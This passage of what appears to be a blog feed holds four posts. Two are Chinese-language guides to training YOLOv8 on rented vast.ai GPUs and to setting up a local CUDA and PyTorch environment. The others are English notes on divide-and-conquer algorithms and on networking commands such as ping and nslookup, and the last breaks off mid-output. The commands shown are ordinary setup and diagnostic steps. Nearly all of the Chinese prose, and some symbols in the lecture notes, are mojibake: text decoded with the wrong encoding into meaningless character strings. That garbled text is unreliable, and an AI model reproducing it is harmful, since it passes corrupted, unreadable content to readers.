title="èƒŒæ™¯"></a>èƒŒæ™¯</h1><p>æœ¬æ–‡è®°å½•ç§Ÿç”¨äº‘å¹³å°ç®—åŠ›è¿›è¡Œè®­ç»ƒï¼Œå‡è½»æœ¬æœºä½¿ç”¨æ˜¾å¡çš„loadã€‚ç”±äºç¬”è®°æœ¬æœ¬èº«æ˜¾å¡èƒ½è€—å—é™ã€æ•£çƒ­ä¸ä½³ã€æ˜¾å­˜å—é™ç­‰é—®é¢˜ï¼Œæˆ‘ä¸ªäººå»ºè®®å°½é‡é¿å…ç¬”è®°æœ¬overloadã€‚</p><p>å…³äºå¦‚ä½•ä½¿ç”¨äº‘å¹³å°è¿›è¡Œè®­ç»ƒï¼Œéœ€è¦å…·å¤‡cudaã€Linuxã€yoloçš„ä¸€äº›çŸ¥è¯†ã€‚</p><p>æ­¤å¤„ä»¥vastaiå¹³å°ä½¿ç”¨yolov8è®­ç»ƒæ¨¡å‹ä¸ºä¾‹ã€‚</p><h1 id="æ”¾å¼ƒå›½å†…ç®—åŠ›å¹³å°"><a href="#æ”¾å¼ƒå›½å†…ç®—åŠ›å¹³å°" class="headerlink" title="æ”¾å¼ƒå›½å†…ç®—åŠ›å¹³å°"></a>æ”¾å¼ƒå›½å†…ç®—åŠ›å¹³å°</h1><p>æ­¤æ—¶æˆ‘åœ¨å›½å¤–ï¼Œæœ€å¼€å§‹é€‰æ‹©äº†å›½å†…ç®—åŠ›å¹³å°â€œæ™ºæ˜Ÿäº‘â€ï¼ˆ<a href="https://gpu.ai-galaxy.cn/ï¼‰ï¼Œä½†æ˜¯å¾ˆå¿«å‘ç°ä¸€äº›ç½‘ç»œé—®é¢˜ã€‚æœåŠ¡å™¨å¹¶éå…·å¤‡ç‹¬ç«‹IPï¼Œåªæ˜¯VPSå‘å¤–æ˜ å°„SSHæˆ–RDPç«¯å£åšäº†å†…ç½‘ç©¿é€ï¼Œä¸çŸ¥æ˜¯å¦æ˜¯GFWé—®é¢˜å¯¼è‡´ç½‘ç»œéå¸¸å¡é¡¿ã€RDPæ–­æ–­ç»­ç»­é—®é¢˜ã€‚å› ä¸ºæ— æ³•è§£å†³æ¯”è¾ƒå¿«é€Ÿçš„ä¸Šä¼ è®­ç»ƒæ–‡ä»¶ï¼ˆ2.5GBï¼‰å·¦å³ï¼Œä¸”å…¶ä¸‹è½½å›½å¤–æœåŠ¡å™¨æ–‡ä»¶é€Ÿåº¦è¿‡æ…¢ï¼Œé‚æ”¾å¼ƒã€‚">https://gpu.ai-galaxy.cn/ï¼‰ï¼Œä½†æ˜¯å¾ˆå¿«å‘ç°ä¸€äº›ç½‘ç»œé—®é¢˜ã€‚æœåŠ¡å™¨å¹¶éå…·å¤‡ç‹¬ç«‹IPï¼Œåªæ˜¯VPSå‘å¤–æ˜ å°„SSHæˆ–RDPç«¯å£åšäº†å†…ç½‘ç©¿é€ï¼Œä¸çŸ¥æ˜¯å¦æ˜¯GFWé—®é¢˜å¯¼è‡´ç½‘ç»œéå¸¸å¡é¡¿ã€RDPæ–­æ–­ç»­ç»­é—®é¢˜ã€‚å› ä¸ºæ— æ³•è§£å†³æ¯”è¾ƒå¿«é€Ÿçš„ä¸Šä¼ è®­ç»ƒæ–‡ä»¶ï¼ˆ2.5GBï¼‰å·¦å³ï¼Œä¸”å…¶ä¸‹è½½å›½å¤–æœåŠ¡å™¨æ–‡ä»¶é€Ÿåº¦è¿‡æ…¢ï¼Œé‚æ”¾å¼ƒã€‚</a></p><h1 id="é€‰æ‹©å›½å¤–ç®—åŠ›å¹³å°vastai"><a href="#é€‰æ‹©å›½å¤–ç®—åŠ›å¹³å°vastai" class="headerlink" title="é€‰æ‹©å›½å¤–ç®—åŠ›å¹³å°vastai"></a>é€‰æ‹©å›½å¤–ç®—åŠ›å¹³å°vastai</h1><p>æ­¤å¤„ä»¥vastaiä¸ºä¾‹ <a href="https://cloud.vast.ai/">https://cloud.vast.ai/</a></p><h2 id="æ³¨å†Œè´¦å·"><a href="#æ³¨å†Œè´¦å·" class="headerlink" title="æ³¨å†Œè´¦å·"></a>æ³¨å†Œè´¦å·</h2><p>ä½¿ç”¨Googleè´¦å·å°±å¯ä»¥ç™»é™†ç½‘ç«™</p><p><img src="/2025/04/07/Python/vastai-remotely-yolo/2025-04-07-19-09-29.png" alt></p><p>éœ€è¦å°†å³ä¾§çš„å››ä¸ªè¦æ±‚è§£å†³æ‰å¯ä»¥å®Œæˆç§Ÿèµã€‚</p><p>éªŒè¯é‚®ç®±</p><p><img src="/2025/04/07/Python/vastai-remotely-yolo/2025-04-07-19-09-49.png" alt></p><p>é€‰æ‹©templateï¼Œæ­¤å¤„é€‰æ‹©ç°æˆçš„pytorchã€‚ç‚¹å‡»torchä¸‹é¢é‚£ä¸ªå°æ’­æ”¾é”® å°±é€‰æ‹©äº†ã€‚</p><p><img src="/2025/04/07/Python/vastai-remotely-yolo/2025-04-07-19-10-26.png" alt></p><p>æŠŠç£ç›˜æ‹‰åˆ°50GBåŠä»¥ä¸Šï¼Œç£ç›˜å¤ªå°ä¸€èˆ¬å¾ˆå®¹æ˜“å‡ºç°æ‚ä¸ƒæ‚å…«çš„é—®é¢˜ï¼Œå› æ­¤diskä¸è¦å°çš„å¤ªæé™ã€‚</p><p><img src="/2025/04/07/Python/vastai-remotely-yolo/2025-04-07-19-10-41.png" alt></p><p>å……é’±ï¼Œç•¥ã€‚</p><h2 id="é€‰è´­GPU"><a href="#é€‰è´­GPU" class="headerlink" title="é€‰è´­GPU"></a>é€‰è´­GPU</h2><p>æœ€åé€‰æ‹©å…·ä½“çš„GPU rent.</p><p><img src="/2025/04/07/Python/vastai-remotely-yolo/2025-04-07-19-11-10.png" alt></p><p>æ­¤å¤„<strong>æ³¨æ„</strong>ï¼Œ<strong>å¾ˆå¤šGPUå®ä¾‹å…¶å®è¿è¡Œä¸èµ·æ¥</strong>ã€‚è¯¥å¹³å°æœ¬è´¨æ˜¯åˆ›å»ºGPUç›´è¿çš„dockerå®¹å™¨ï¼Œæ³¨æ„æ£€æŸ¥æ—¥å¿—æ˜¯å¦æœ‰æŠ¥é”™ï¼Œæœ‰æŠ¥é”™çš„å®ä¾‹ç›´æ¥åˆ é™¤å°±å¯ä»¥äº†ã€‚</p><p>åªèƒ½è¿‡æ»¤å‡ºæ¥è‡ªå·±å¸Œæœ›ä½¿ç”¨çš„æ˜¾å¡ï¼Œç„¶åä¸€ä¸ªä¸€ä¸ªè¯•ï¼ˆä¸ç”¨æ‹…å¿ƒè¯•å¤ªå¤šå®¹å™¨ä¼šèŠ±é’±ï¼Œä»–è¿™æ²¡è·‘èµ·æ¥çš„å®¹å™¨ä¸èŠ±é’±ï¼‰ï¼ŒçŸ¥é“è§‚å¯Ÿåˆ°è¿™ä¸ªæŒ‰é’®æ˜¯<strong>Connecting</strong>, <strong>Open</strong>è¯´æ˜è¿™ä¸ªå®ä¾‹å¯ä»¥ç”¨èµ·æ¥ã€‚</p><p>å¦‚ä¸‹ï¼ŒRTX5090,æ˜¾å­˜32GBï¼š</p><p><img src="/2025/04/07/Python/vastai-remotely-yolo/2025-04-07-19-11-46.png" alt></p><p>å¦‚å›¾æ‰€ç¤ºï¼Œç¡®å®å¯ä»¥è¿è¡Œï¼š</p><p><img src="/2025/04/07/Python/vastai-remotely-yolo/2025-04-07-19-11-57.png" alt></p><h2 id="é€šè¿‡JupyterLabè¿æ¥å®ä¾‹"><a href="#é€šè¿‡JupyterLabè¿æ¥å®ä¾‹" class="headerlink" title="é€šè¿‡JupyterLabè¿æ¥å®ä¾‹"></a>é€šè¿‡JupyterLabè¿æ¥å®ä¾‹</h2><p>ç‚¹è‡ªå·±å®ä¾‹çš„OpenæŒ‰é’®ï¼ˆæ­¤å¤„æˆ‘æ²¡æœ‰è¯•æˆåŠŸç›´æ¥çš„SSHè¿æ¥ï¼‰</p><p>Openåè·³è½¬çš„é¡µé¢çš„è¿™ä¸¤ä¸ªApplicationå¯ä»¥å®Œæˆçš„æ–‡ä»¶ä¸Šä¼ ä¸‹è½½ã€ä¿®æ”¹ä»£ç ã€æ‰§è¡Œshellã€‚</p><p>æˆ‘ä¹ æƒ¯ç‚¹<strong>Jupyter Terminal</strong> ç„¶åç‚¹å¼€ <strong>Jupyter Lab</strong>.</p><p><img src="/2025/04/07/Python/vastai-remotely-yolo/2025-04-07-19-12-28.png" alt></p><p><img src="/2025/04/07/Python/vastai-remotely-yolo/2025-04-07-19-12-34.png" alt></p><p><img src="/2025/04/07/Python/vastai-remotely-yolo/2025-04-07-19-12-43.png" alt></p><p>æ­¤å¤„å¯ä»¥è½»æ˜“çš„é€šè¿‡æ‹–æ‹½æ¥æ–‡ä»¶IOï¼ˆé€Ÿåº¦å¾ˆå¿«ï¼‰ï¼Œä¹Ÿå¯ä»¥é€šè¿‡terminalè¿è¡Œshellã€‚ä¸Šä¼ ä¸‹è½½æ–‡ä»¶çš„æ—¶é—´ä½ å¤§æ¦‚å‡ºå»åƒä¸€é¡¿é¥­ã€‚æ¯”å¦‚è¿™24GBçš„æ–‡ä»¶è´¹äº†å¤§æ¦‚åŠä¸ªå°æ—¶ã€‚</p><p><img src="/2025/04/07/Python/vastai-remotely-yolo/2025-04-07-19-13-08.png" alt></p><p>æœ‰èƒ½è°ƒç”¨CUDAçš„torch</p><p><img src="/2025/04/07/Python/vastai-remotely-yolo/2025-04-07-19-13-31.png" alt></p><p>å¯ä»¥çœ‹åˆ°RTX4090çš„24Gçš„æ˜¾å­˜ï¼Œæ»¡åŠŸè€—450Wï¼ˆæˆ‘è¿™é‡Œç”¨å¦ä¸€ä¸ªå®ä¾‹è·‘yoloä»»åŠ¡ï¼‰</p><p><img src="/2025/04/07/Python/vastai-remotely-yolo/2025-04-07-19-13-55.png" alt></p><h1 id="å¼€å§‹è®­ç»ƒ"><a href="#å¼€å§‹è®­ç»ƒ" class="headerlink" title="å¼€å§‹è®­ç»ƒ"></a>å¼€å§‹è®­ç»ƒ</h1><p>pipç¼ºä»€ä¹ˆåº“è‡ªå·±è¡¥å…¨ï¼šå¦‚<code>pip install ultralytics</code></p><h2 id="æ‘†å¥½yoloçš„è®­ç»ƒå§¿åŠ¿"><a href="#æ‘†å¥½yoloçš„è®­ç»ƒå§¿åŠ¿" class="headerlink" title="æ‘†å¥½yoloçš„è®­ç»ƒå§¿åŠ¿"></a>æ‘†å¥½yoloçš„è®­ç»ƒå§¿åŠ¿</h2><p>å›¾ç‰‡ã€labelä¾æ¬¡æ”¾å…¥å¦‚ä¸‹ç›®å½•ï¼š</p><pre><code>/test/images/test/labels/train/images/train/labels</code></pre><h3 id="data-yaml"><a href="#data-yaml" class="headerlink" title="data.yaml"></a>data.yaml</h3><pre><code># å›¾ç‰‡è·¯å¾„train: /workspace/trainval: /workspace/test# ç±»åˆ«ä¿¡æ¯nc: 5names: [&quot;xxx1&quot;, &quot;xxx2&quot;, &quot;xxx3&quot;, &quot;xxx4&quot;, &quot;xxx5&quot;]</code></pre><h3 id="train-yolo-py"><a href="#train-yolo-py" class="headerlink" title="train_yolo.py"></a>train_yolo.py</h3><p>ç•¥</p><h2 id="ä½¿ç”¨screenè®©è®­ç»ƒåå°è¿è¡Œ"><a href="#ä½¿ç”¨screenè®©è®­ç»ƒåå°è¿è¡Œ" class="headerlink" title="ä½¿ç”¨screenè®©è®­ç»ƒåå°è¿è¡Œ"></a>ä½¿ç”¨screenè®©è®­ç»ƒåå°è¿è¡Œ</h2><p>å¦‚æœä½ çŸ¥é“SSHä¼šè¯ä¸€æ–­ï¼Œç›¸å…³çš„å­è¿›ç¨‹éƒ½ä¸ä¼šè¿è¡Œã€‚</p><p>æ­¤å¤„æˆ‘ä»¬éœ€è¦åå°è®­ç»ƒï¼Œå› ä¸ºæ—¶é—´è€—è´¹æ¯”è¾ƒé•¿ï¼Œæˆ‘ä»¬ä¹Ÿå¯èƒ½å…³æ‰åŸºäºWEBçš„SSHä¼šè¯ã€‚</p><pre><code>apt install screen</code></pre><p>åˆ›å»ºyoloä¼šè¯</p><pre><code>screen -S yolo</code></pre><p>ç°åœ¨å°±è¿›å…¥yoloçš„screenäº†ã€‚</p><p>å°†æ ‡å‡†è¾“å‡ºã€é”™è¯¯è¾“å‡ºï¼Œå®šå‘åˆ°ã€‹./log æ–‡ä»¶ï¼Œæ–¹ä¾¿æˆ‘ä»¬æœªæ¥æŸ¥çœ‹å½“å‰yoloè¿è¡Œåˆ°ä»€ä¹ˆç¨‹åº¦äº†ï¼š</p><pre><code>python train.py &gt; ./log.txt 2&gt;&amp;1</code></pre><p>å®Œæˆå <strong>ctrl+A + D (é¡ºåºæŒ‰ä¸‹)</strong>é€€å‡ºå½“å‰screenã€‚</p><p>å¦‚æœæƒ³åˆ‡å›ä¹‹å‰çš„yoloçš„screenä¼šè¯ï¼š</p><p>screen -ls æŸ¥çœ‹screençš„åå°ä¼šè¯</p><pre><code>(main) root@C.19270554:/workspace$ screen -lsThere is a screen on:        1911.yolo       (04/07/25 07:49:53)     (Detached)1 Socket in /run/screen/S-root.</code></pre><p><code>screen -r 1911.yolo</code> åˆ‡å›è¾“å…¥å‘½ä»¤çš„ä¼šè¯ã€‚</p><p>æŸ¥çœ‹æ—¥å¿—ï¼šï¼ˆä¸éœ€è¦è¿›å…¥screenä¼šè¯ï¼‰ï¼Œç›´æ¥æŸ¥çœ‹æ–‡ä»¶å³å¯ï¼štailå‘½ä»¤å¯ä»¥æŸ¥çœ‹è¿™ä¸ªæ—¥å¿—</p><pre><code>tail -f ./log.txt</code></pre><p><img src="/2025/04/07/Python/vastai-remotely-yolo/2025-04-07-19-17-03.png" alt></p><p><img src="/2025/04/07/Python/vastai-remotely-yolo/2025-04-07-19-17-13.png" alt></p><hr><p>è·‘äº†å¤§æ¦‚ä¸¤å°æ—¶ï¼Œè·‘100è½® 16 batchï¼Œè·‘å®Œäº†ï¼š</p><p><img src="/2025/04/07/Python/vastai-remotely-yolo/2025-04-07-20-06-51.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> Py </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>local yolo envir</title>
      <link href="/2025/04/07/Python/local-yolo-envir/"/>
      <url>/2025/04/07/Python/local-yolo-envir/</url>
      
        <content type="html"><![CDATA[<h1 id="åˆ›å»ºpython12è§£é‡Šå™¨"><a href="#åˆ›å»ºpython12è§£é‡Šå™¨" class="headerlink" title="åˆ›å»ºpython12è§£é‡Šå™¨"></a>åˆ›å»ºpython12è§£é‡Šå™¨</h1><pre><code>conda create -n py12 python=3.12</code></pre><p>æ ¹æ®æç¤ºå°†è§£é‡Šå™¨ç›®å½•ä»conda/envs/py12ç›®å½•å¤åˆ¶åˆ°COMP9517ç›®å½•</p><h1 id="å®‰è£…yoloä¾èµ–"><a href="#å®‰è£…yoloä¾èµ–" class="headerlink" title="å®‰è£…yoloä¾èµ–"></a>å®‰è£…yoloä¾èµ–</h1><p>pyproject.toml ä¸­å­˜å‚¨æœ‰pyé¡¹ç›®ä¾èµ–ä¿¡æ¯</p><p>C:\Users\amber\Desktop\COMP9517ç›®å½•ä¸‹cmdæ‰§è¡Œå‘½ä»¤</p><pre><code>C:\Users\amber\Desktop\COMP9517\py12\python.exe -m pip install .</code></pre><h1 id="å®‰è£…pytorch"><a href="#å®‰è£…pytorch" class="headerlink" title="å®‰è£…pytorch"></a>å®‰è£…pytorch</h1><p>æˆ‘ä»¬è‚¯å®šé€‰æ‹©GPUç‰ˆæœ¬ï¼Œå¦åˆ™è®­ç»ƒå›¾ç‰‡è‹¥CPUï¼Œæ—¶é—´å¤ªé•¿</p><p><a href="https://pytorch.org/">https://pytorch.org/</a></p><p>æˆ‘ä»¬çš„cudaæ˜¯12.4æ‰€ä»¥ç›´æ¥ç”¨pipæ–¹å¼å¼„</p><p><img src="/2025/04/07/Python/local-yolo-envir/2025-04-07-19-21-06.png" alt></p><p>æ‰§è¡Œå‘½ä»¤</p><pre><code>C:\Users\amber\Desktop\COMP9517\py12\python.exe -m pip install torch torchvision torchaudio --index-url https://download.pytorch.org/whl/cu124</code></pre><p><img src="/2025/04/07/Python/local-yolo-envir/2025-04-07-19-21-22.png" alt></p><p>å®‰è£…å®Œåç¡®è®¤ä¸‹torchæ˜¯å¦è°ƒç”¨æ˜¾å¡ï¼šå®Œç¾</p><pre><code>&gt;&gt;&gt; import torch&gt;&gt;&gt; print(&quot;CUDA is available:&quot;, torch.cuda.is_available())CUDA is available: True</code></pre><p><img src="/2025/04/07/Python/local-yolo-envir/2025-04-07-19-21-36.png" alt></p><h1 id="å®‰è£…cuda"><a href="#å®‰è£…cuda" class="headerlink" title="å®‰è£…cuda"></a>å®‰è£…cuda</h1><p>nvidia control panelè¯´æˆ‘æœ¬æœºæ˜¾å¡ç‰ˆæœ¬12.5.85</p><p><img src="/2025/04/07/Python/local-yolo-envir/2025-04-07-19-21-56.png" alt></p><p>åˆå› ä¸ºpytorchå®˜æ–¹è¯´cuda 12.4æ¯”è¾ƒåˆé€‚</p><p><img src="/2025/04/07/Python/local-yolo-envir/2025-04-07-19-22-08.png" alt></p><p>æ‰€ä»¥å®‰è£…cudaæˆ‘è¦12.4</p><p>cuda12.4ä¸‹è½½é“¾æ¥</p><p><a href="https://developer.nvidia.com/cuda-12-4-0-download-archive?target_os=Windows&amp;target_arch=x86_64&amp;target_version=11&amp;target_type=exe_local">https://developer.nvidia.com/cuda-12-4-0-download-archive?target_os=Windows&amp;target_arch=x86_64&amp;target_version=11&amp;target_type=exe_local</a></p><p>å®‰è£…åˆ° D:\cuda12\</p><p><img src="/2025/04/07/Python/local-yolo-envir/2025-04-07-19-22-33.png" alt></p><p>å®‰è£…å®Œæ¯•</p><p>æ–°æ‰“å¼€ä¸€ä¸ªcmd</p><p>æ‰§è¡Œå‘½ä»¤</p><pre><code>nvidia-smiNVCC â€“version</code></pre><p>å¯ä»¥çœ‹åˆ°æ˜¾å¡å¯ä»¥æ­£å¸¸è¢«è°ƒç”¨äº†</p><p>è¿™é‡Œè¯´cuda versionæ˜¯12.5,æœ‰ç‚¹å¥‡æ€ªï¼Œå› ä¸ºæˆ‘ä»¬å®‰è£…çš„æ˜¯12.4ã€‚å¦‚æœä¹‹åå®‰è£…pytorchä¸å½±å“ä½¿ç”¨ï¼Œè¿™ä¸ªå°é—®é¢˜å°±å¿½ç•¥ã€‚</p><p><img src="/2025/04/07/Python/local-yolo-envir/2025-04-07-19-23-00.png" alt></p><p><img src="/2025/04/07/Python/local-yolo-envir/2025-04-07-19-23-06.png" alt></p><h1 id="ä½¿ç”¨yoloè®­ç»ƒå›¾ç‰‡"><a href="#ä½¿ç”¨yoloè®­ç»ƒå›¾ç‰‡" class="headerlink" title="ä½¿ç”¨yoloè®­ç»ƒå›¾ç‰‡"></a>ä½¿ç”¨yoloè®­ç»ƒå›¾ç‰‡</h1><p>é¦–å…ˆç¡®è®¤ï¼Œæˆ‘ä»¬ç”µè„‘åªæœ‰ä¸€ä¸ªæ˜¾å¡ç›®å‰ï¼Œdeviceå·æ˜¯0</p><p><img src="/2025/04/07/Python/local-yolo-envir/2025-04-07-19-23-19.png" alt></p><p>yolo.exeçš„å‘½ä»¤ä½ç½®å¦‚ä¸‹ C:\Users\amber\Desktop\COMP9517\py12\Scripts\yolo.exe</p><p>ä¹‹åä½¿ç”¨è¯¥å‘½ä»¤ç›´æ¥ç»å¯¹è·¯å¾„è°ƒç”¨ï¼Œç›´æ¥æŠŠyoloå‘½ä»¤å†™å¦‚batæ–‡ä»¶</p><p><img src="/2025/04/07/Python/local-yolo-envir/2025-04-07-19-23-44.png" alt></p><p>ç„¶åcmdä¸­è¿è¡Œè¿™ä¸ªbatå‘½ä»¤</p><p><img src="/2025/04/07/Python/local-yolo-envir/2025-04-07-19-23-58.png" alt></p><h1 id="torchç‰ˆæœ¬è¿‡é«˜ï¼Œæ¢äº†ä¸€ä¸ªä½çš„"><a href="#torchç‰ˆæœ¬è¿‡é«˜ï¼Œæ¢äº†ä¸€ä¸ªä½çš„" class="headerlink" title="torchç‰ˆæœ¬è¿‡é«˜ï¼Œæ¢äº†ä¸€ä¸ªä½çš„"></a>torchç‰ˆæœ¬è¿‡é«˜ï¼Œæ¢äº†ä¸€ä¸ªä½çš„</h1><p>è¯¥æ­»ï¼Œå¤±è´¥</p>]]></content>
      
      
      <categories>
          
          <category> Py </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>wk2-lec</title>
      <link href="/2025/02/26/COMP9101/wk2-lec/"/>
      <url>/2025/02/26/COMP9101/wk2-lec/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="#problem-of-27-coins-within-a-counterfeit">problem of 27 coins, within a counterfeit</a><ul><li><a href="#solution">Solution</a></li></ul></li><li><a href="#binary-search">Binary search</a><ul><li><a href="#binary-search-extensions">Binary search extensions</a></li></ul></li><li><a href="#decision-problems-and-optimisation-problems">Decision problems and optimisation problems</a><ul><li><a href="#definition">Definition</a></li><li><a href="#problem-example-optimisation-problem-maximum-median">Problem: Example optimisation problem: Maximum Median</a><ul><li><a href="#related-problem">Related problem</a></li><li><a href="#algorithm-for-related-problem">Algorithm (for related problem)</a></li></ul></li></ul></li><li><a href="#merge-sort">Merge sort</a></li><li><a href="#examplecounting-the-number-of-inversions">Example:Counting The Number Of inversions</a></li></ul><hr><ol><li>Introductory Examples<br>1.1 Coin puzzle<br>1.2 Binary search<br>1.3 Merge sort<br>1.4 Quick sort<br>1.5 Divide and Conquer paradigm</li><li>Recurrences<br>2.1 Framework<br>2.2 Master Theorem</li><li>Integer Multiplication<br>3.1 Applying D&amp;C to multiplication of large integers<br>3.2 The Karatsuba trick</li><li>Convolutions<br>4.1 Polynomials<br>4.2 The Fast Fourier Transform</li><li>Puzzle</li></ol><hr><h1 id="problem-of-27-coins-within-a-counterfeit"><a href="#problem-of-27-coins-within-a-counterfeit" class="headerlink" title="problem of 27 coins, within a counterfeit"></a>problem of 27 coins, within a counterfeit</h1><p>We are given 27 coins of the same denomination; we know that one of them is counterfeit and that it is lighter than the others. Find the counterfeit coin by weighing coins on a pan balance only three times.</p><p><strong>Hint</strong></p><p>You can reduce the search space by a third in one weighing!</p><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p><img src="/2025/02/26/COMP9101/wk2-lec/2025-02-28-14-02-35.png" alt></p><p><img src="/2025/02/26/COMP9101/wk2-lec/2025-02-28-14-05-28.png" alt></p><p>This method is called â€œ<strong>divide-and-conquer</strong>â€.</p><p>We have already seen some prototypical â€œseriousâ€ algorithms designed using this method: <strong>binary search</strong>, <strong>merge sort</strong> and <strong>quicksort</strong>.</p><p>Weâ€™ll now review these algorithms from a divide-and-conquer perspective, and adapt them to solve problems.</p><h1 id="Binary-search"><a href="#Binary-search" class="headerlink" title="Binary search"></a>Binary search</h1><p>Steps:</p><ul><li><strong>Divide</strong>: Test the midpoint of the search range ($Î˜(1)$)</li><li><strong>Conquer</strong>: Search one side of the midpoint recursively</li><li><strong>Combine</strong>: Pass the answer up the recursion tree (Î˜(1))</li></ul><p>Recursion is $log_2 n$ levels deep, with a total of $Î˜(1)$ time spent in each level.</p><p>Time complexity is $Î˜(logn)$.</p><h2 id="Binary-search-extensions"><a href="#Binary-search-extensions" class="headerlink" title="Binary search extensions"></a>Binary search extensions</h2><p>Given an array A, sorted in non-decreasing order, and an integer x.</p><ul><li><p>Lower bound: find the smallest index i such that A[i] â‰¥ x.</p></li><li><p>Upper bound: find the largest index i such that A[i] â‰¤ x.</p></li><li><p>Equal range: find the range of indices $â„“..r$ such that $A[â„“] = â€¦ = A[r] = x$.</p></li></ul><h1 id="Decision-problems-and-optimisation-problems"><a href="#Decision-problems-and-optimisation-problems" class="headerlink" title="Decision problems and optimisation problems"></a>Decision problems and optimisation problems</h1><p><strong>Decision problems</strong></p><p>Questions of the form: â€œGiven some input, is there an x which . . . â€</p><p>Answer is â€œYesâ€ or â€œNoâ€.</p><p><strong>Optimisation problems</strong></p><ul><li><p>Questions of the form: â€œWhat is the smallest/largest x for which â€¦â€</p></li><li><p>Answer is an object, e.g., a set or a number.</p></li></ul><p>An optimisation problem is typically harder than the corresponding decision problem.</p><p>But we can sometimes use decision problems to help us solve optimisation problems.</p><h2 id="Definition"><a href="#Definition" class="headerlink" title="Definition"></a>Definition</h2><p>Recall that the median of an array is the <strong>middle value</strong> in sorted order.</p><p>For example, the <strong>median</strong> of [1,2,2,4,5] is 2.</p><h2 id="Problem-Example-optimisation-problem-Maximum-Median"><a href="#Problem-Example-optimisation-problem-Maximum-Median" class="headerlink" title="Problem: Example optimisation problem: Maximum Median"></a>Problem: Example optimisation problem: Maximum Median</h2><p>Ling has an array A consisting of 2n-1 integers, sorted from smallest to largest. Note that the median is initially A[n].</p><p>She wants her numbers to grow big and strong, so for each of the following $k$ days she adds 1 to one of her numbers.</p><p>At the end of the $k$ days, what is the largest possible median that her array can have?</p><p>Example</p><p>If the starting array is [1,2,2,4,5] and k=3, the maximum median is 4, achieved by adding 1 to the third number on the first two days and to any number on the last day.</p><p>Using all three increases on the third number does not make the median value 5.</p><h3 id="Related-problem"><a href="#Related-problem" class="headerlink" title="Related problem"></a>Related problem</h3><p>Given positive integers $t$ and $k$. Ling wants to know whether she can make the median of her numbers at least the target value $t$ (by adding $1$ to one of her numbers each day for $k$ days).</p><p>How do we get the median to at least t?</p><ul><li>Increase the middle value A[n] and everything after it to $t$;<br>nothing to do for any values that are $â‰¥t$ already.</li></ul><p>Why might we fail?</p><ul><li>$t$ could be too big (relative to $k$). I.e. if $k$ is too small then we could run out of days.</li><li>Unused days are fine (so long as our array has at least 3 entries).</li></ul><p><img src="/2025/02/26/COMP9101/wk2-lec/2025-03-01-20-36-26.png" alt></p><p><img src="/2025/02/26/COMP9101/wk2-lec/2025-03-01-20-36-49.png" alt></p><p><img src="/2025/02/26/COMP9101/wk2-lec/2025-03-01-20-36-33.png" alt></p><h3 id="Algorithm-for-related-problem"><a href="#Algorithm-for-related-problem" class="headerlink" title="Algorithm (for related problem)"></a>Algorithm (for related problem)</h3><script type="math/tex; mode=display">\sum_{i=n}^{2n-1} max(t-A[i],0)</script><p>If this value is $â‰¤k$, report yes; otherwise report no.</p><p>This algorithm clearly runs in $O(n)$ in the worst case.</p><h1 id="Merge-sort"><a href="#Merge-sort" class="headerlink" title="Merge sort"></a>Merge sort</h1><p>Steps:</p><p><strong>Divide</strong>: Split the array into two equal parts $(Î˜(1))$</p><p><strong>Conquer</strong>: Sort each part recursively</p><p><strong>Combine</strong>: Merge the two sorted subarrays $(Î˜(n))$</p><p>Recursion is $log_2 n$ levels deep, with a total of $Î˜(n)$ time spent in each level.</p><p>Time complexity is $Î˜(nlogn)$.</p><h1 id="Example-Counting-The-Number-Of-inversions"><a href="#Example-Counting-The-Number-Of-inversions" class="headerlink" title="Example:Counting The Number Of inversions"></a>Example:Counting The Number Of inversions</h1>]]></content>
      
      
      <categories>
          
          <category> COMP9101 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>commands</title>
      <link href="/2025/02/24/COMP9331/commands/"/>
      <url>/2025/02/24/COMP9331/commands/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="#ping">ping</a></li><li><a href="#nslookup">nslookup</a></li><li><a href="#traceroute">traceroute</a><ul><li><a href="#å‘½ä»¤å†…å®¹è¯¦è§£">å‘½ä»¤å†…å®¹è¯¦è§£</a></li></ul></li><li><a href="#telnet-obsolete">telnet (obsolete)</a></li><li><a href="#ssh">ssh</a></li><li><a href="#ifconfig">ifconfig</a></li><li><a href="#netstat">netstat</a></li><li><a href="#curl">curl</a></li></ul><h1 id="ping"><a href="#ping" class="headerlink" title="ping"></a>ping</h1><p>The <strong>ping</strong> utility is used to check connectivity to a host (to check if a hostâ€™s operating and network connections are intact). A small packet is sent through the network to a particular IP address. This packet contains 64 bytes containing 56 data bytes and 8 bytes of protocol header information. The host that sent the packet waits (or â€˜listensâ€™) for a return packet. A valid return packet will be received if the connections are good and the target host is up. The <strong>ping</strong> can also measure the round trip time of a packet. We use the following forms of the command:</p><p>ping host</p><p>where the host is the name or IP address of a host. It only answers whether the connectivity to the host is OK or not.</p><p>ping -s packetsize host </p><p>Option -s packetsize specifies the number of data bytes to be sent. The default is 56 Bytes (Linux).</p><p>ping -i interval host </p><p>Option -i interval specifies the interval between sending ping requests. The default is one second.</p><h1 id="nslookup"><a href="#nslookup" class="headerlink" title="nslookup"></a>nslookup</h1><pre><code>nslookup www.telstra.com.au</code></pre><pre><code>z5541664@vx14:~/Desktop$ nslookup www.telstra.com.auServer:        129.94.242.2Address:    129.94.242.2#53Non-authoritative answer:www.telstra.com.au    canonical name = d2l3pjybjlbg0l.cloudfront.net.Name:    d2l3pjybjlbg0l.cloudfront.netAddress: 18.67.110.87Name:    d2l3pjybjlbg0l.cloudfront.netAddress: 18.67.110.86Name:    d2l3pjybjlbg0l.cloudfront.netAddress: 18.67.110.83Name:    d2l3pjybjlbg0l.cloudfront.netAddress: 18.67.110.103Name:    d2l3pjybjlbg0l.cloudfront.netAddress: 2600:9000:2215:7600:17:876d:b540:93a1Name:    d2l3pjybjlbg0l.cloudfront.netAddress: 2600:9000:2215:8800:17:876d:b540:93a1Name:    d2l3pjybjlbg0l.cloudfront.netAddress: 2600:9000:2215:f000:17:876d:b540:93a1Name:    d2l3pjybjlbg0l.cloudfront.netAddress: 2600:9000:2215:6200:17:876d:b540:93a1Name:    d2l3pjybjlbg0l.cloudfront.netAddress: 2600:9000:2215:1400:17:876d:b540:93a1Name:    d2l3pjybjlbg0l.cloudfront.netAddress: 2600:9000:2215:1e00:17:876d:b540:93a1Name:    d2l3pjybjlbg0l.cloudfront.netAddress: 